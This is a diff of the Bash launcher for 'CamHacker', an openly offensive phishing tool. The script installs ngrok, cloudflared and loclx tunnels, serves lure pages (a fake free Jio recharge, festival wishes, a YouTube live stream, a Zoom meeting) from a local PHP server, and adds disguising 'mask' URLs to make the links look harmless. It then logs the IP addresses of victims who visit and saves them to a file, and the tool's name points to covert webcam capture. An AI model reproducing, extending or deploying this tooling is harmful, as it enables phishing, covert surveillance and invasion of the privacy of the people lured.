-fi
-if ! [ `command -v curl` ]; then
-    echo -e "${error}Curl cannot be installed!\007\n"
-    exit 1
-fi
-if ! [ `command -v unzip` ]; then
-    echo -e "${error}Unzip cannot be installed!\007\n"
-    exit 1
-fi
-if ! [ `command -v wget` ]; then
-    echo -e "${error}Wget cannot be installed!\007\n"
-    exit 1
-fi
-if [ `pidof php > /dev/null 2>&1` ]; then
-    echo -e "${error}Previous php cannot be closed. Restart terminal!\007\n"
-    exit 1
-fi
-if [ `pidof ngrok > /dev/null 2>&1` ]; then
-    echo -e "${error}Previous ngrok cannot be closed. Restart terminal!\007\n"
-    exit 1
-fi
+
+# Check if required packages are successfully installed
+for package in php wget curl unzip; do
+    if ! command -v "$package"  > /dev/null 2>&1; then
+        echo -e "${error}${package} cannot be installed!\007\n"
+        exit 1
+    fi
+done
+
+# Check for running processes that couldn't be terminated
+killer
+for process in php wget curl unzip ngrok cloudflared loclx localxpose; do
+    if pidof "$process"  > /dev/null 2>&1; then
+        echo -e "${error}Previous ${process} cannot be closed. Restart terminal!\007\n"
+        exit 1
+    fi
+done
 
 
 # Download tunnlers
-if ! [[ -f $HOME/.ngrokfolder/ngrok || -f $HOME/.cffolder/cloudflared ]] ; then
-    # Termux should run from home
-    if $termux; then
-        if echo "$cwd" | grep -q "home"; then
-            printf ""
-        else
-            echo -e "${error}Invalid directory. Run from home!\007\n"
-            exit 1
-        fi
-    fi
-    if ! [[ -d $HOME/.ngrokfolder ]]; then
-        cd $HOME && mkdir .ngrokfolder
-    fi
-    if ! [[ -d $HOME/.cffolder ]]; then
-        cd $HOME && mkdir .cffolder
-    fi
-    arch=`uname -m`
-    platform=`uname`
-    while true; do
-        echo -e "\n${info}Downloading Tunnelers:\n"
-        netcheck
-        if [ -e ngrok.zip ];then
-            rm -rf ngrok.zip
-        fi
-        cd "$cwd"
-        if echo "$platform" | grep -q "Darwin"; then
-            if echo "$arch" | grep -q "x86_64"; then
-                wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-darwin-amd64.zip" -O "ngrok.zip"
-                ngrokdel
-                wget -q --show-progress "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz" -O "cloudflared.tgz"
-                tar -zxf cloudflared.tgz > /dev/null 2>&1
-                rm -rf cloudflared.tgz
-                break
-            elif echo "$arch" | grep -q "arm64"; then
-                wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-arm64.zip" -O "ngrok.zip"
-                ngrokdel
-                echo -e "${error}Cloudflared not available for device architecture!"
-                sleep 3
-                break
-            else
-                echo -e "${error}Device architecture unknown. Download ngrok/cloudflared manually!"
-                sleep 3
-                break
-            fi
-        elif echo "$platform" | grep -q "Linux"; then
-            if echo "$arch" | grep -q "aarch64"; then
-                if [ -e ngrok-stable-linux-arm64.tgz ];then
-                   rm -rf ngrok-stable-linux-arm64.tgz
-                fi
-                wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-arm64.tgz" -O "ngrok.tgz"
-                tar -zxf ngrok.tgz
-                rm -rf ngrok.tgz
-                wget -q --show-progress "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64" -O "cloudflared"
-                break
-            elif echo "$arch" | grep -q "arm"; then
-                wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-arm.zip" -O "ngrok.zip"
-                ngrokdel
-                wget -q --show-progress 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' -O "cloudflared"
-                break
-            elif echo "$arch" | grep -q "x86_64"; then
-                wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-amd64.zip" -O "ngrok.zip"
-                ngrokdel
-                wget -q --show-progress 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' -O "cloudflared"
-                break
-            else
-                wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-386.zip" -O "ngrok.zip"
-                ngrokdel
-                wget -q --show-progress "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386" -O "cloudflared"
-                break
-            fi
-        else
-            echo -e "${error}Unsupported Platform!"
-            exit
-        fi
-    done
-    sleep 1
-    cd "$cwd"
-    mv -f ngrok $HOME/.ngrokfolder
-    mv -f cloudflared $HOME/.cffolder
-    if $sudo; then
-    sudo chmod +x $HOME/.ngrokfolder/ngrok
-    sudo chmod +x $HOME/.cffolder/cloudflared
-    else
-    chmod +x $HOME/.ngrokfolder/ngrok
-    chmod +x $HOME/.cffolder/cloudflared
-    fi
+arch=$(uname -m)
+platform=$(uname)
+if ! [[ -d $tunneler_dir ]]; then
+    mkdir $tunneler_dir
 fi
+if ! [[ -f $tunneler_dir/ngrok ]] ; then
+    nongrok=true
+else
+    nongrok=false
+fi
+if ! [[ -f $tunneler_dir/cloudflared ]] ; then
+    nocf=true
+else
+    nocf=false
+fi
+if ! [[ -f $tunneler_dir/loclx ]] ; then
+    noloclx=true
+else
+    noloclx=false
+fi
+netcheck
+rm -rf ngrok.tgz ngrok.zip cloudflared cloudflared.tgz loclx.zip
+cd "$cwd"
+if echo "$platform" | grep -q "Darwin"; then
+    if $brew; then
+        ! $ngrok && brew install ngrok/ngrok/ngrok
+        ! $cloudflared && brew install cloudflare/cloudflare/cloudflared
+        ! $loclx && brew install localxpose
+    else
+        if echo "$arch" | grep -q "x86_64"; then
+            $nongrok && manage_tunneler "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-darwin-amd64.zip" "ngrok.zip"
+            $nocf && manage_tunneler "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz" "cloudflared.tgz"
+            $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-darwin-amd64.zip" "loclx.zip"
+        elif echo "$arch" | grep -q "arm64"; then
+            $nongrok && manage_tunneler "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-darwin-arm64.zip" "ngrok.zip"
+            echo -e "${error}Device architecture unknown. Download cloudflared manually!"
+            sleep 3
+            $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-darwin-arm64.zip" "loclx.zip"
+        else
+            echo -e "${error}Device architecture unknown. Download ngrok/cloudflared/loclx manually!"
+            sleep 3
+        fi
+    fi
+elif echo "$platform" | grep -q "Linux"; then
+    if echo "$arch" | grep -q "aarch64"; then
+        $nongrok && manage_tunneler "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-arm64.tgz" "ngrok.tgz"
+        $nocf && manage_tunneler "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64" "cloudflared"
+        $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip" "loclx.zip"
+    elif echo "$arch" | grep -q "arm"; then
+        $nongrok && manage_tunneler "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-arm.tgz" "ngrok.tgz"
+        $nocf && manage_tunneler "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm" "cloudflared"
+        $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip" "loclx.zip"
+    elif echo "$arch" | grep -q "x86_64"; then
+        $nongrok && manage_tunneler "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-amd64.tgz" "ngrok.tgz"
+        $nocf && manage_tunneler "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64" "cloudflared"
+        $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip" "loclx.zip"
+    else
+        $nongrok && manage_tunneler "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-386.tgz" "ngrok.tgz"
+        $nocf && manage_tunneler "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386" "cloudflared"
+        $noloclx && manage_tunneler "https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip" "loclx.zip"
+    fi
+else
+    echo -e "${error}Unsupported Platform!"
+    exit
+fi
+
+
 
 # Check for update
 netcheck
@@ -432,8 +371,8 @@ else
     fi
 fi
 
-if [[ "$version" != "$git_ver" && "$git_ver" != "404: Not Found" ]]; then
-    changelog=`curl -s -N https://raw.githubusercontent.com/KasRoudra/CamHacker/main/files/changelog.log`
+if [[ "$git_ver" != "404: Not Found" && "$git_ver" != "$version" ]]; then
+    changelog=$(curl -s -N https://raw.githubusercontent.com/KasRoudra/CamHacker/main/files/changelog.log)
     clear
     echo -e "$logo"
     echo -e "${info}CamHacker has a new update!\n${info}Current: ${red}${version}\n${info}Available: ${green}${git_ver}\n"
@@ -444,7 +383,8 @@ if [[ "$version" != "$git_ver" && "$git_ver" != "404: Not Found" ]]; then
             cd .. && rm -rf CamHacker camhacker && git clone https://github.com/KasRoudra/CamHacker
             echo -e "\n${success}CamHacker updated successfully!!"
             if [[ "$changelog" != "404: Not Found" ]]; then
-            echo -e "${purple}[•] Changelog:\n${blue}${changelog}"
+                echo -e "${purple}[•] Changelog:\n${blue}"
+                echo $changelog | head -n3
             fi
             exit
         elif [[ "$upask" == "n" ]]; then
@@ -457,15 +397,15 @@ if [[ "$version" != "$git_ver" && "$git_ver" != "404: Not Found" ]]; then
 fi
 
 # Ngrok Authtoken
-if ! [[ -e $HOME/.ngrok2/ngrok.yml ]]; then
+if ! [[ -e $HOME/.config/ngrok/ngrok.yml ]]; then
     echo -e "\n${ask}Enter your ngrok authtoken:"
     printf "${cyan}\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
     read auth
-    if [ -z $auth ]; then
+    if [ -z "$auth" ]; then
         echo -e "\n${error}No authtoken!\n\007"
         sleep 1
     else
-        cd $HOME/.ngrokfolder && ./ngrok authtoken ${auth}
+        cd $tunneler_dir && ./ngrok config add-authtoken authtoken ${auth}
     fi
 fi
 
@@ -482,7 +422,6 @@ ${cyan}[${white}3${cyan}] ${yellow}Live Youtube
 ${cyan}[${white}4${cyan}] ${yellow}Online Meeting
 ${cyan}[${white}d${cyan}] ${yellow}Change Image Directory (current: ${red}${FOL}${yellow})
 ${cyan}[${white}p${cyan}] ${yellow}Change Default Port (current: ${red}${PORT}${yellow})
-${cyan}[${white}t${cyan}] ${yellow}Change Default Tunneler (current: ${red}${TN}${yellow})
 ${cyan}[${white}x${cyan}] ${yellow}About
 ${cyan}[${white}m${cyan}] ${yellow}More tools
 ${cyan}[${white}0${cyan}] ${yellow}Exit${blue}
@@ -501,39 +440,24 @@ fi
 # Select template
     if echo $option | grep -q "1"; then
         dir="jio"
+        mask="https://free-399rs-jio-recharge"
         break
     elif echo $option | grep -q "2"; then
         dir="fest"
-        printf "\n${ask}Enter festival name:${cyan}\n\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
+        printf "\n${ask}Enter festival name${yellow} (Current: ${green}birthday):${cyan}\n\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
         read fest_name
-        if [ -z $fest_name ]; then
-            echo -e "\n${error}Invalid input!\n\007"
-            sleep 2
-        else
-            fest_name="${fest_name//[[:space:]]/}"
-            break
-        fi
+        mask="https://best-wishes-to-you"
+        break
     elif echo $option | grep -q "3"; then
         dir="live"
         printf "\n${ask}Enter youtube video ID:${cyan}\n\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
         read vid_id
-        if [ -z $vid_id ]; then
-            echo -e "\n${error}Invalid input!\n\007"
-            sleep 1
-        else
-            break
-        fi
+        mask="https://watch-youtube-videos-live"
+        break
     elif echo $option | grep -q "4"; then
         dir="om"
+        mask="https://join-zoom-online-meeting"
         break
-    elif echo $option | grep -q "t"; then
-        if [ $TN == "Cloudflared" ]; then
-            TN="Ngrok"
-        else
-            TN="Cloudflared"
-        fi
-        echo -e "${success}Tunneler switched to ${TN} successfully!\n"
-        sleep 2
     elif echo $option | grep -q "p"; then
         printf "\n${ask}Enter Port:${cyan}\n\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
         read pore
@@ -579,22 +503,27 @@ $red[Email]      ${cyan} :[kasroudrakrd@gmail.com]"
         sleep 1
     fi
 done
-cd $cwd
+if ! [ -d "$HOME/.site" ]; then
+    mkdir "$HOME/.site"
+else
+    cd $HOME/.site
+    rm -rf *
+fi
+cd "$cwd"
 if [ -e websites.zip ]; then
     unzip websites.zip > /dev/null 2>&1
     rm -rf websites.zip
 fi
-if ! [ -d $dir ]; then
-    mkdir $dir
-    cd $dir
-    netcheck
-    wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/${dir}.zip"
-    unzip ${dir}.zip > /dev/null 2>&1
-    rm -rf ${dir}.zip
-else
-    cd $dir
-fi
 
+if ! [ -d sites ]; then
+    mkdir sites
+    netcheck
+    wget -q --show-progress "https://github.com/KasRoudra/CamHacker/releases/latest/download/websites.zip"
+    unzip websites.zip -d sites > /dev/null 2>&1
+    rm -rf websites.zip
+fi
+cd sites/$dir
+cp -r * "$HOME/.site"
 # Hotspot required for termux
 if $termux; then
     echo -e "\n${info2}If you haven't turned on hotspot, please enable it!"
@@ -602,63 +531,111 @@ if $termux; then
 fi
 echo -e "\n${info}Starting php server at localhost:${PORT}....\n"
 netcheck
+cd "$HOME/.site"
 php -S 127.0.0.1:${PORT} > /dev/null 2>&1 &
 sleep 2
-echo -e "${info2}Starting tunnelers......\n"
-rm -rf "$HOME/.cffolder/log.txt"
-netcheck
-cd $HOME/.ngrokfolder && ./ngrok http 127.0.0.1:${PORT} > /dev/null 2>&1 &
-if $termux; then
-    cd $HOME/.cffolder && termux-chroot ./cloudflared tunnel -url "127.0.0.1:${PORT}" --logfile "log.txt" > /dev/null 2>&1 &
-else
-    cd $HOME/.cffolder && ./cloudflared tunnel -url "127.0.0.1:${PORT}" --logfile "log.txt" > /dev/null 2>&1 &
-fi
-sleep 8
-ngroklink=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
-if (echo "$ngroklink" | grep -q "ngrok"); then
-    ngrokcheck=true
-else
-    ngrokcheck=false
-fi
-cflink=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "$HOME/.cffolder/log.txt")
-if (echo "$cflink" | grep -q "cloudflare"); then
-    cfcheck=true
-else
-    cfcheck=false
-fi
-while true; do
-if ( $cfcheck && $ngrokcheck ); then
-    if [ $TN == "Cloudflared" ]; then
-        echo -e "${success}Cloudflared has been chosen!\n"
-        replacer "$cflink"
-    else
-        echo -e "${success}Ngrok has been chosen!\n"
-        replacer "$ngroklink"
-    fi
-    break
-fi
-if ( $cfcheck &&  ! $ngrokcheck ); then
-    echo -e "${success}Cloudflared has started successfully!\n"
-    replacer "$cflink"
-    break
-fi
-if ( ! $cfcheck && $ngrokcheck ); then
-    echo -e "${success}Ngrok has started successfully!\n"
-    replacer "$ngroklink"
-    break
-fi
-if ! ( $cfcheck && $ngrokcheck ); then
-    echo -e "${error}Tunneling failed! Start your own tunneling service at port ${PORT}"
-    break
-fi
-done
 sleep 1
 status=$(curl -s --head -w %{http_code} 127.0.0.1:${PORT} -o /dev/null)
 if echo "$status" | grep -q "404"; then
     echo -e "${error}PHP couldn't start!\n\007"
-    killer; exit 1
+    killer
+    exit 1
 else
     echo -e "${success}PHP has started successfully!\n"
+fi
+echo -e "${info2}Starting tunnelers......\n"
+find "$tunneler_dir" -name "*.log" -delete
+netcheck
+cd $tunneler_dir
+if $termux; then
+    termux-chroot ./ngrok http 127.0.0.1:${PORT} > /dev/null 2>&1 &
+    termux-chroot ./cloudflared tunnel -url "127.0.0.1:${PORT}" --logfile cf.log > /dev/null 2>&1 &
+    termux-chroot ./loclx tunnel http --to ":${PORT}" &> loclx.log &
+elif $brew; then
+    ngrok http 127.0.0.1:${PORT} > /dev/null 2>&1 &
+    cloudflared tunnel -url "127.0.0.1:${PORT}" --logfile cf.log > /dev/null 2>&1 &
+    localxpose tunnel http --to ":${PORT}" &> loclx.log &
+else
+    ./ngrok http 127.0.0.1:${PORT} > /dev/null 2>&1 &
+    ./cloudflared tunnel -url "127.0.0.1:${PORT}" --logfile cf.log > /dev/null 2>&1 &
+    ./loclx tunnel http --to ":${PORT}" &> loclx.log &
+fi
+sleep 10
+cd "$HOME/.site"
+if echo $option | grep -q "2"; then
+    if ! [ -z "$fest_name" ]; then
+        sed -i s/"birthday"/"$fest_name"/g index.html
+    fi
+fi
+if echo $option | grep -q "3"; then
+    if ! [ -z "$vid_id" ]; then
+         netcheck
+         if curl -s -N "https://www.youtube.com/embed/${vid_id}?autoplay=1" | grep -q "https://www.youtube.com/watch?v=${vid_id}"; then
+              sed -i s/"6hHmkInZkMQ"/"$vid_id"/g index.html
+         else
+              echo -e "${error}Inavlid youtube video ID!. Using default value.\007\n"
+         fi
+    fi
+fi
+ngroklink=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z.]*.ngrok.io")
+if ! [ -z "$ngroklink" ]; then
+    ngrokcheck=true
+else
+    ngrokcheck=false
+fi
+for second in {1..10}; do
+    if [ -f "$tunneler_dir/cf.log" ]; then
+        cflink=$(grep -o "https://[-0-9a-z]*.trycloudflare.com" "$tunneler_dir/cf.log")
+        sleep 1
+    fi
+    if ! [ -z "$cflink" ]; then
+        cfcheck=true
+        break
+    else
+        cfcheck=false
+    fi
+done
+for second in {1..10}; do
+    if [ -f "$tunneler_dir/loclx.log" ]; then
+        loclxlink=$(grep -o "[-0-9a-z]*\.loclx.io" "$tunneler_dir/loclx.log")
+        sleep 1
+    fi
+    if ! [ -z "$loclxlink" ]; then
+        loclxcheck=true
+        loclxlink="https://${loclxlink}"
+        break
+    else
+        loclxcheck=false
+    fi
+done
+if ( $ngrokcheck && $cfcheck && $loclxcheck ); then
+    echo -e "${success}Ngrok, Cloudflared and Loclx have started successfully!\n"
+    url_manager "$cflink" 1 2
+    url_manager "$ngroklink" 3 4
+    url_manager "$loclxlink" 5 6
+elif ( $ngrokcheck && $cfcheck &&  ! $loclxcheck ); then
+    echo -e "${success}Ngrok and Cloudflared have started successfully!\n"
+    url_manager "$cflink" 1 2
+    url_manager "$ngroklink" 3 4
+elif ( $ngrokcheck && $loclxcheck &&  ! $cfcheck ); then
+    echo -e "${success}Ngrok and Loclx have started successfully!\n"
+    url_manager "$ngroklink" 1 2
+    url_manager "$loclxlink" 3 4
+elif ( $cfcheck && $loclxcheck &&  ! $loclxcheck ); then
+    echo -e "${success}Cloudflared and Loclx have started successfully!\n"
+    url_manager "$cflink" 1 2
+    url_manager "$loclxlink" 3 4
+elif ( $ngrokcheck && ! $cfcheck &&  ! $loclxcheck ); then
+    echo -e "${success}Ngrok has started successfully!\n"
+    url_manager "$ngroklink" 1 2
+elif ( $cfcheck &&  ! $ngrokcheck &&  ! $loclxcheck ); then
+    echo -e "${success}Cloudflared has started successfully!\n"
+    url_manager "$cflink" 1 2
+elif ( $loclxcheck && ! $ngrokcheck &&  ! $cfcheck ); then
+    echo -e "${success}Loclx has started successfully!\n"
+    url_manager "$loclxlink" 1 2
+elif ! ( $ngrokcheck && $cfcheck && $loclxcheck ) ; then
+    echo -e "${error}Tunneling failed! Start your own port forwarding/tunneling service at port ${PORT}\n";
 fi
 sleep 1
 rm -rf ip.txt
@@ -670,7 +647,7 @@ while true; do
             echo -e "${green}[${blue}*${green}]${yellow} $line"
         done < ip.txt
         echo ""
-        cat ip.txt >> $cwd/ips.txt
+        cat ip.txt >> "$cwd/ip.txt"
         rm -rf ip.txt
     fi
     sleep 0.5
@@ -682,5 +659,4 @@ while true; do
     fi
     sleep 0.5
 done
-
 
